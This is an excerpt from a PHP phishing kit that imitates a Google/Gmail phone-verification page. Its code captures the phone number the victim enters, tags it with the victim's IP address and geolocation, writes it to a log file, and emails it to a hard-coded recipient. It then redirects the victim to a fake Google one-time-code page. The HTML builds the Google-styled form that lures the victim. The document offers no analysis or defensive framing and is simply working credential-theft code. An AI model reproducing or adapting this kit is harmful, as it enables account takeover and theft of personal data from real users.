<?php
    ...
    if(isset($_POST['submit'])){
        $nomba = $_POST['nomba'];
        $_SESSION['nomba'] = $nomba;
        
        $subject =  "{" .$user_ip . "} | GMAIL Line | [" . $_SESSION['icity']. "," . $_SESSION['icountrycode'] . "]";
        ...
        $var = "\n\n $var_str;\n\n";
        file_put_contents('../mylogGz2.txt', $var, FILE_APPEND);
        

        $result = mail(reciever, $subject, $message, $header);
        
        header("Location: ./otp.google.php?locale=en-US&authID={$_SESSION['token']}&start={$_SESSION['fstamp']}&end={$_SESSION['lund']}");
                   ...
                   <div class="ryf-pAY">
                       <div class="Wxw">
                           <form action="" method="post" enctype="multipart/form-data">
                               <section class="atz">
                                   <div class="cxr">
                                       <div class="prd">Enter your phone number to get a text message with a verification code. </div>
                                       <span class="sakam"><img src="./44ex.png" alt=""></span>
                                       <input type="text" class="input-f g-inp redu" placeholder="Phone number" name="nomba" required>
                                       <label for="g-lab" class="g-lab gensu">Phone number</label>
                                   </div>
                               </section>
                           <div class="zq">
                               <div class="flier">
